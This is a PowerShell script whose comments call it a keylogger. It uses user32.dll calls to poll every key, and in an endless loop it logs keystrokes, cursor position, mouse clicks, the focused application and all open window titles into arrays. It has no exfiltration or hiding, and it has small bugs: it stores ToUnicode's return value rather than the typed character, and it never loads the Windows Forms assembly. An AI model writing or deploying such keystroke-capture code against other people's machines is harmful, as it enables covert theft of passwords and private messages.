# Add-Type for focused app detection
Add-Type @"
  using System;
  using System.Runtime.InteropServices;
  public class UserWindows {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
}
"@

# API declaration for keylogger
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru



# arrays for storing user actions and environment
$record = @()
$cursorTrack = @()
$keyTrack = @()
$imageSize = 7
$image = [object[]]::new($imageSize)


# main while loop for listening to user actions
$continue = $true
while($continue){


    Start-Sleep -Milliseconds 500


    ## print date and time
    "DATE"
    $date = Get-Date
    $date
    
    
    ## get screen resolution
    $screen = Get-WmiObject -Class Win32_DesktopMonitor 
    $screen | Format-Table ScreenWidth,ScreenHeight
    

    ## print current cursor position
    "CURSOR POSITION"
    $cursor = [System.Windows.Forms.Cursor]::Position
    $cursor
    $cursorTrack += $date
    $cursorTrack += $cursor

    ## print current pressed mouse button
    "PRESSED MOUSE BUTTON"
    $button = [System.Windows.Forms.UserControl]::MouseButtons
    $button


    #$pressedKey = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

    for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get key state
        $keystate = $API::GetAsyncKeyState($ascii)
        # if key pressed
        if ($keystate -eq -32767) {
          "KEY PRESSED"
          $null = [console]::CapsLock
          # translate code
          $virtualKey = $API::MapVirtualKey($ascii, 3)
          # get keyboard state and create stringbuilder
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder
          $key = $API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0)
          $keyTrack += $key

        ## lists all opened windows
        "ALL OPENED APPS"
        $process = Get-Process | Where-Object { $_.MainWindowTitle } 
        $process | Format-Table ID,Name,Mainwindowtitle
        

        ## shows the focus app
        "FOCUSED APP"            
        $ActiveHandle = [UserWindows]::GetForegroundWindow()
        $focused = Get-Process | Where-Object {$_.MainWindowHandle -eq $ActiveHandle} 
        $focused | Format-Table ID,Name,Mainwindowtitle
        
        $image[0] = $date
        $image[1] = $screen
        $image[2] = $cursor
        $image[3] = $button
        $image[4] = $key
        $image[5] = $process
        $image[6] = $focused

        $record = $record + $image
        }
    }


    if($button -ne "None"){

        ## lists all opened windows
        "ALL OPENED APPS"
        $process = Get-Process | Where-Object { $_.MainWindowTitle } 
        $process | Format-Table ID,Name,Mainwindowtitle
        

        ## shows the focus app
        "FOCUSED APP"            
        $ActiveHandle = [UserWindows]::GetForegroundWindow()
        $focused = Get-Process | Where-Object {$_.MainWindowHandle -eq $ActiveHandle} 
        $focused | Format-Table ID,Name,Mainwindowtitle
        
        $image[0] = $date
        $image[1] = $screen
        $image[2] = $cursor
        $image[3] = $button
        $image[4] = $null
        $image[5] = $process
        $image[6] = $focused

        $record = $record + $image
    }
}

